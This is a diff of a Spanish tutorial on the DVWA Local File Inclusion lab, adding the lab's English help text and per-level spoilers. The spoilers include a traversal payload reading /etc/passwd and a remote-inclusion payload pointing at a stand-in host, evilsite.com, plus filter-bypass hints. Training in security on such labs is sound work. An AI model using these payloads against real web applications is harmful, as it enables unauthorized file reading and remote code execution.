@@ -83,16 +83,11 @@ Para mitigar el riesgo de LFI y asegurar que la inclusión dinámica se use de m
 
 
 # Laboratorio LFI de DVWA
-**Acerca del laboratorio:** Algunas aplicaciones web permiten al usuario especificar entradas que se utilizan directamente en flujos de archivos o permiten al usuario subir archivos al servidor. En un momento posterior, la aplicación web accede a la entrada proporcionada por el usuario en el contexto de la aplicación web. Al hacer esto, la aplicación web está permitiendo la posibilidad de ejecución de archivos maliciosos. Si el archivo elegido para incluirse es local en la máquina objetivo, se denomina "Inclusión de Archivos Locales (LFI)". Pero los archivos también pueden incluirse en otras máquinas, en cuyo caso el ataque es una "Inclusión de Archivos Remotos (RFI)".
 
-Cuando RFI no es una opción, usar otra vulnerabilidad con LFI (como la subida de archivos y la transversalidad de directorios) a menudo puede lograr el mismo efecto.
-
-Nota, el término "inclusión de archivos" no es lo mismo que "acceso arbitrario a archivos" o "divulgación de archivos".
-
-**Objetivo del laboratorio Local File Inclusion de DVWA:**
+## Objetivo del laboratorio Local File Inclusion de DVWA
 Leer las cinco citas famosas de '../hackable/flags/fi.php' usando solo la inclusión de archivos.
 
-**View Source**
+## View Source
 ```
 <?php
 
@@ -143,6 +138,56 @@ $file = $_GET[ 'page' ];
 
 ?>
 ```
+
+## View Help
+About
+Some web applications allow the user to specify input that is used directly into file streams or allows the user to upload files to the server. At a later time the web application accesses the user supplied input in the web applications context. By doing this, the web application is allowing the potential for malicious file execution. If the file chosen to be included is local on the target machine, it is called "Local File Inclusion (LFI). But files may also be included on other machines, which then the attack is a "Remote File Inclusion (RFI).
+
+When RFI is not an option. using another vulnerability with LFI (such as file upload and directory traversal) can often achieve the same effect.
+Note, the term "file inclusion" is not the same as "arbitrary file access" or "file disclosure".
+
+Objective
+Read all five famous quotes from '../hackable/flags/fi.php' using only the file inclusion.
+----------------------------------------------------------------------
+**Acerca del laboratorio:**
+Algunas aplicaciones web permiten al usuario especificar entradas que se utilizan directamente en flujos de archivos o permiten al usuario subir archivos al servidor. En un momento posterior, la aplicación web accede a la entrada proporcionada por el usuario en el contexto de la aplicación web. Al hacer esto, la aplicación web está permitiendo la posibilidad de ejecución de archivos maliciosos. Si el archivo elegido para incluirse es local en la máquina objetivo, se denomina "Inclusión de Archivos Locales (LFI)". Pero los archivos también pueden incluirse en otras máquinas, en cuyo caso el ataque es una "Inclusión de Archivos Remotos (RFI)".
+
+Cuando RFI no es una opción, usar otra vulnerabilidad con LFI (como la subida de archivos y la transversalidad de directorios) a menudo puede lograr el mismo efecto.
+
+Nota, el término "inclusión de archivos" no es lo mismo que "acceso arbitrario a archivos" o "divulgación de archivos".
+
+----------------------------------------------------------------------------------
+### Low Level
+This allows for direct input into one of many PHP functions that will include the content when executing.
+
+Depending on the web service configuration will depend if RFI is a possibility.
+
+Spoiler: LFI: ?page=../../../../../../etc/passwd.
+			Spoiler: RFI: ?page=http://www.evilsite.com/evil.php.
+
+### Medium Level
+The developer has read up on some of the issues with LFI/RFI, and decided to filter the input. However, the patterns that are used, isn't enough.
+
+Spoiler: LFI: Possible, due to it only cycling through the pattern matching once.
+			Spoiler: RFI: PHP Streams.
+
+### High Level
+The developer has had enough. They decided to only allow certain files to be used. However as there are multiple files with the same basename, they use a wildcard to include them all.
+
+Spoiler: LFI: The filename only has start with a certain value..
+			Spoiler: RFI: Need to link in another vulnerability, such as file upload.
+
+### Impossible Level
+The developer calls it quits and hardcodes only the allowed pages, with there exact filenames. By doing this, it removes all avenues of attack.
+
+
+Reference: Wikipedia - File inclusion vulnerability
+
+Reference: WSTG - Local File Inclusion
+
+Reference: WSTG - Remote File Inclusion
+
+Reference: PHP File Inclusion
 
 
 **Usamos DVWA, sección File Inclusión:**
